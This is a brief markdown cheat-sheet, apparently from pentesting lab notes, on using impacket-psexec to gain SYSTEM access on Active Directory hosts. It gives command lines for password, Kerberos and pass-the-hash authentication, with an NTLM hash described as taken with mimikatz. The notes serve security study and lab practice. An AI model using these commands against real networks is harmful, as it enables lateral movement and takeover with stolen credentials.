---
tags:
  - active_directory
---
# psexec

Use administrative credentials to authenticate to an Active Directory machine as `nt authority\system`

Requires:

- User logging in to be a member of the `administrators` local group
- `ADMIN$` share must be available (default)
- File and printer sharing must be turned on (default)

## Capabilities

```bash
# Authenticate with username/password
impacket-psexec 'analysis.htb/Mojo:Password123!@10.129.189.54'

# Authenticate with kerberos
impacket-psexec support.htb/Administrator@dc.support.htb -k -no-pass

# Authenticate with hash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

Note: In the hash example, we fill in the left side of the colon with zeros, and the right is the administrators NTLM hash pulled from `mimikatz`
